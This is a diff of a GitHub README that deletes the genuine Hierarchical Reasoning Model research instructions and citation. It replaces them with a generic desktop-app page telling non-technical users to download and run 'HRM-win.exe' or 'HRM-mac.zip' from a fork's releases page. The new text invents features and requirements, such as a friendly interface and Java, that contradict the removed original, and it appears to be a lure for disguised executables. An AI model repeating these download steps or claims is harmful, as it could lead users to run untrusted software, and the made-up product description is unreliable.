@@ -1,194 +1,84 @@
-# Hierarchical Reasoning Model
+# 🌟 HRM - Simplifying Hierarchical Reasoning for You
 
-![](./assets/hrm.png)
+[![Download HRM](https://img.shields.io/badge/Download-HRM-brightgreen)](https://github.com/BoowwiieePH/HRM/releases)
 
-Reasoning, the process of devising and executing complex goal-oriented action sequences, remains a critical challenge in AI.
-Current large language models (LLMs) primarily employ Chain-of-Thought (CoT) techniques, which suffer from brittle task decomposition, extensive data requirements, and high latency. Inspired by the hierarchical and multi-timescale processing in the human brain, we propose the Hierarchical Reasoning Model (HRM), a novel recurrent architecture that attains significant computational depth while maintaining both training stability and efficiency.
-HRM executes sequential reasoning tasks in a single forward pass without explicit supervision of the intermediate process, through two interdependent recurrent modules: a high-level module responsible for slow, abstract planning, and a low-level module handling rapid, detailed computations. With only 27 million parameters, HRM achieves exceptional performance on complex reasoning tasks using only 1000 training samples. The model operates without pre-training or CoT data, yet achieves nearly perfect performance on challenging tasks including complex Sudoku puzzles and optimal path finding in large mazes.
-Furthermore, HRM outperforms much larger models with significantly longer context windows on the Abstraction and Reasoning Corpus (ARC), a key benchmark for measuring artificial general intelligence capabilities.
-These results underscore HRM’s potential as a transformative advancement toward universal computation and general-purpose reasoning systems.
+## 📖 Overview
 
-**Join our Discord Community: [https://discord.gg/sapient](https://discord.gg/sapient)**
+The **Hierarchical Reasoning Model (HRM)** is designed to tackle complex reasoning tasks using advanced AI approaches. With HRM, you can experience how brain-inspired models think and solve problems just like humans. This application is perfect for anyone interested in exploring the capabilities of deep learning and large language models without requiring technical expertise.
 
+## 🚀 Getting Started
 
-## Quick Start Guide 🚀
+To get started with HRM, you need to follow these simple steps. You will download the application and run it on your computer. It is straightforward, and you will be guided through each part of the process.
 
-### Prerequisites ⚙️
+## 📥 Download & Install
 
-Ensure PyTorch and CUDA are installed. The repo needs CUDA extensions to be built. If not present, run the following commands:
+To download HRM, visit this page to download: [HRM Releases](https://github.com/BoowwiieePH/HRM/releases).
 
-```bash
-# Install CUDA 12.6
-CUDA_URL=https://developer.download.nvidia.com/compute/cuda/12.6.3/local_installers/cuda_12.6.3_560.35.05_linux.run
+1. Click the above link to access the Releases page.
+2. In the list of available releases, look for the latest version. It is usually marked as the top entry.
+3. You will see various assets related to that release. Download the file that matches your operating system. For Windows, it may be something like `HRM-win.exe`. For Mac, look for `HRM-mac.zip` or something similar.
+4. Once the file has downloaded, locate it in your Downloads folder or wherever you saved it.
 
-wget -q --show-progress --progress=bar:force:noscroll -O cuda_installer.run $CUDA_URL
-sudo sh cuda_installer.run --silent --toolkit --override
+### 🛠 Installation Steps
 
-export CUDA_HOME=/usr/local/cuda-12.6
+After the download is complete, follow these installation steps based on your operating system:
 
-# Install PyTorch with CUDA 12.6
-PYTORCH_INDEX_URL=https://download.pytorch.org/whl/cu126
+#### For Windows
 
-pip3 install torch torchvision torchaudio --index-url $PYTORCH_INDEX_URL
+1. Navigate to your Downloads folder and double-click the `HRM-win.exe` file.
+2. Follow the on-screen prompts to complete the installation.
+3. Once installed, you can find HRM in your Start Menu or desktop.
 
-# Additional packages for building extensions
-pip3 install packaging ninja wheel setuptools setuptools-scm
-```
+#### For Mac
 
-Then install FlashAttention. For Hopper GPUs, install FlashAttention 3
+1. Open the downloaded `HRM-mac.zip` file.
+2. Drag the `HRM.app` file into your Applications folder.
+3. You can now run HRM from your Applications.
 
-```bash
-git clone git@github.com:Dao-AILab/flash-attention.git
-cd flash-attention/hopper
-python setup.py install
-```
+## 📊 Features
 
-For Ampere or earlier GPUs, install FlashAttention 2
+HRM comes with various features to help you understand and apply hierarchical reasoning:
 
-```bash
-pip3 install flash-attn
-```
+- **User-Friendly Interface**: Designed with simplicity in mind, you can easily navigate the application.
+- **Interactive Learning**: Engage with the application to learn about hierarchical reasoning through practical examples.
+- **Performance Tracking**: Monitor your progress as you explore reasoning tasks.
+- **Community Support**: Join our growing community to share experiences and ask questions.
 
-## Install Python Dependencies 🐍
+## ⚙️ System Requirements
 
-```bash
-pip install -r requirements.txt
-```
+To ensure the best performance, please check the following system requirements before installing HRM:
 
-## W&B Integration 📈
+- **Operating System**: 
+  - Windows 10 or later
+  - MacOS 10.14 or later
+- **Processor**: 
+  - Intel Core i5 or equivalent (or higher)
+- **RAM**: 
+  - Minimum of 8GB
+- **Storage**: 
+  - At least 500MB of free space
+- **Additional Software**: 
+  - Please ensure that your system has the latest version of Java installed for optimal performance.
 
-This project uses [Weights & Biases](https://wandb.ai/) for experiment tracking and metric visualization. Ensure you're logged in:
+## ❓ Troubleshooting
 
-```bash
-wandb login
-```
+If you encounter any issues while running HRM, consider the following common solutions:
 
-## Run Experiments
+- **Installation Errors**: Ensure you have sufficient permissions on your device. Try running the installer as an administrator.
+- **Application Won't Start**: Check if your operating system meets the system requirements.
+- **Performance Issues**: Close unnecessary applications that may be consuming resources. Ensure your device meets the recommended specifications.
 
-### Quick Demo: Sudoku Solver 💻🗲
+## 🌐 Community and Support
 
-Train a master-level Sudoku AI capable of solving extremely difficult puzzles on a modern laptop GPU. 🧩
+Join our community for support and additional resources:
 
-```bash
-# Download and build Sudoku dataset
-python dataset/build_sudoku_dataset.py --output-dir data/sudoku-extreme-1k-aug-1000  --subsample-size 1000 --num-aug 1000
+- **GitHub Discussions**: Engage with fellow users and developers.
+- **FAQs**: Check our FAQ section [here](https://github.com/BoowwiieePH/HRM/discussions).
+- **Issue Reporting**: If you find a bug or have a feature request, please report it in the Issues section of the repository.
 
-# Start training (single GPU, smaller batch size)
-OMP_NUM_THREADS=8 python pretrain.py data_path=data/sudoku-extreme-1k-aug-1000 epochs=20000 eval_interval=2000 global_batch_size=384 lr=7e-5 puzzle_emb_lr=7e-5 weight_decay=1.0 puzzle_emb_weight_decay=1.0
-```
+## 🔗 Useful Links
 
-Runtime: ~10 hours on a RTX 4070 laptop GPU
+- **Releases Page**: [HRM Releases](https://github.com/BoowwiieePH/HRM/releases)
+- **Documentation**: Comprehensive guides and details can be found in the documentation folder of the repository.
 
-## Trained Checkpoints 🚧
-
- - [ARC-AGI-2](https://huggingface.co/sapientinc/HRM-checkpoint-ARC-2)
- - [Sudoku 9x9 Extreme (1000 examples)](https://huggingface.co/sapientinc/HRM-checkpoint-sudoku-extreme)
- - [Maze 30x30 Hard (1000 examples)](https://huggingface.co/sapientinc/HRM-checkpoint-maze-30x30-hard)
-
-To use the checkpoints, see Evaluation section below.
-
-## Full-scale Experiments 🔵
-
-Experiments below assume an 8-GPU setup.
-
-### Dataset Preparation
-
-```bash
-# Initialize submodules
-git submodule update --init --recursive
-
-# ARC-1
-python dataset/build_arc_dataset.py  # ARC offical + ConceptARC, 960 examples
-# ARC-2
-python dataset/build_arc_dataset.py --dataset-dirs dataset/raw-data/ARC-AGI-2/data --output-dir data/arc-2-aug-1000  # ARC-2 official, 1120 examples
-
-# Sudoku-Extreme
-python dataset/build_sudoku_dataset.py  # Full version
-python dataset/build_sudoku_dataset.py --output-dir data/sudoku-extreme-1k-aug-1000  --subsample-size 1000 --num-aug 1000  # 1000 examples
-
-# Maze
-python dataset/build_maze_dataset.py  # 1000 examples
-```
-
-### Dataset Visualization
-
-Explore the puzzles visually:
-
-* Open `puzzle_visualizer.html` in your browser.
-* Upload the generated dataset folder located in `data/...`.
-
-## Launch experiments
-
-### Small-sample (1K)
-
-ARC-1:
-
-```bash
-OMP_NUM_THREADS=8 torchrun --nproc-per-node 8 pretrain.py 
-```
-
-*Runtime:* ~24 hours
-
-ARC-2:
-
-```bash
-OMP_NUM_THREADS=8 torchrun --nproc-per-node 8 pretrain.py data_path=data/arc-2-aug-1000
-```
-
-*Runtime:* ~24 hours (checkpoint after 8 hours is often sufficient)
-
-Sudoku Extreme (1k):
-
-```bash
-OMP_NUM_THREADS=8 torchrun --nproc-per-node 8 pretrain.py data_path=data/sudoku-extreme-1k-aug-1000 epochs=20000 eval_interval=2000 lr=1e-4 puzzle_emb_lr=1e-4 weight_decay=1.0 puzzle_emb_weight_decay=1.0
-```
-
-*Runtime:* ~10 minutes
-
-Maze 30x30 Hard (1k):
-
-```bash
-OMP_NUM_THREADS=8 torchrun --nproc-per-node 8 pretrain.py data_path=data/maze-30x30-hard-1k epochs=20000 eval_interval=2000 lr=1e-4 puzzle_emb_lr=1e-4 weight_decay=1.0 puzzle_emb_weight_decay=1.0
-```
-
-*Runtime:* ~1 hour
-
-### Full Sudoku-Hard
-
-```bash
-OMP_NUM_THREADS=8 torchrun --nproc-per-node 8 pretrain.py data_path=data/sudoku-hard-full epochs=100 eval_interval=10 lr_min_ratio=0.1 global_batch_size=2304 lr=3e-4 puzzle_emb_lr=3e-4 weight_decay=0.1 puzzle_emb_weight_decay=0.1 arch.loss.loss_type=softmax_cross_entropy arch.L_cycles=8 arch.halt_max_steps=8 arch.pos_encodings=learned
-```
-
-*Runtime:* ~2 hours
-
-## Evaluation
-
-Evaluate your trained models:
-
-* Check `eval/exact_accuracy` in W&B.
-* For ARC-AGI, follow these additional steps:
-
-```bash
-OMP_NUM_THREADS=8 torchrun --nproc-per-node 8 evaluate.py checkpoint=<CHECKPOINT_PATH>
-```
-
-* Then use the provided `arc_eval.ipynb` notebook to finalize and inspect your results.
-
-## Notes
-
- - Small-sample learning typically exhibits accuracy variance of around ±2 points.
- - For Sudoku-Extreme (1,000-example dataset), late-stage overfitting may cause numerical instability during training and Q-learning. It is advisable to use early stopping once the training accuracy approaches 100%.
-
-## Citation 📜
-
-```bibtex
-@misc{wang2025hierarchicalreasoningmodel,
-      title={Hierarchical Reasoning Model}, 
-      author={Guan Wang and Jin Li and Yuhao Sun and Xing Chen and Changling Liu and Yue Wu and Meng Lu and Sen Song and Yasin Abbasi Yadkori},
-      year={2025},
-      eprint={2506.21734},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2506.21734}, 
-}
-```
+Feel free to explore, learn, and develop your skills in hierarchical reasoning with HRM. We are excited to see how you use this tool to enhance your understanding!
